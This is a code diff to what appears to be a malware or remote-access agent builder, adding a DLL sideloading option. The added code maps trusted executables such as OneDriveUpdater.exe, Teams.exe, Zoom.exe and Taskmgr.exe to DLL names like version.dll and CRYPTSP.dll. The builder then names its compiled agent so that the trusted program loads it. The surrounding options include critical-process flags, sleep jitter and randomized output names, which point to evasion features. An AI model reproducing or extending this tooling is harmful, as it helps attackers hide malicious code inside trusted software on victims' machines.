@@ -148,6 +148,7 @@ type BuildProcessConfig = {
   requireAdmin?: boolean;
   criticalProcess?: boolean;
   outputExtension?: string;
+  sideloadTarget?: string;
   sleepSeconds?: number;
   sleepJitterSeconds?: number;
   randomizeOutputName?: boolean;
@@ -1538,14 +1539,19 @@ func binderExec(outPath string, _ []byte) {
         namePrefix = config.outputName || "agent";
       }
       let friendlyOutputName = deps.sanitizeOutputName(
-        platform.includes("windows") ? `${namePrefix}-${platform}${winExt}` : `${namePrefix}-${platform}`,
+        sideloadDllName ? sideloadDllName
+        : platform.includes("windows") ? `${namePrefix}-${platform}${winExt}` : `${namePrefix}-${platform}`,
       );
       let outputName = deps.sanitizeOutputName(
-        platform.includes("windows") ? `${namePrefix}-${platform}-${buildSlug}${winExt}` : `${namePrefix}-${platform}-${buildSlug}`,
+        sideloadDllName ? `${buildSlug}-${sideloadDllName}`
+        : platform.includes("windows") ? `${namePrefix}-${platform}-${buildSlug}${winExt}` : `${namePrefix}-${platform}-${buildSlug}`,
       );
 
       sendToStream({ type: "status", text: `Building ${platform}...` });
       sendToStream({ type: "output", text: `\n=== Building ${platform} ===\n`, level: "info" });
+      if (sideloadDllName) {
+        sendToStream({ type: "output", text: `DLL sideload: target=${config.sideloadTarget} dll=${sideloadDllName}\n`, level: "info" });
+      }
 
       const env: NodeJS.ProcessEnv = {
         ...createIsolatedGoBuildEnv(cacheRoot),
@@ -1979,6 +1985,17 @@ func binderExec(outPath string, _ []byte) {
         baseTags = enforceBuilderReleaseTag(baseTags);
 
         const isDllBuild = effectiveOs === "windows" && winExt === ".dll";
+        const SIDELOAD_DLL_MAP: Record<string, string> = {
+          "OneDriveUpdater.exe": "version.dll",
+          "MicrosoftEdgeUpdate.exe": "version.dll",
+          "Teams.exe": "CRYPTSP.dll",
+          "Zoom.exe": "version.dll",
+          "PhoneExperienceHost.exe": "version.dll",
+          "Taskmgr.exe": "version.dll",
+        };
+        const sideloadDllName = isDllBuild && config.sideloadTarget
+          ? SIDELOAD_DLL_MAP[config.sideloadTarget] ?? null
+          : null;
         const runBuild = async (tags: string[], outputPath: string) => {
           const allTags = isDllBuild ? [...tags, "dll_sideload"] : tags;
           const effectiveTags = enforceBuilderReleaseTag(allTags);
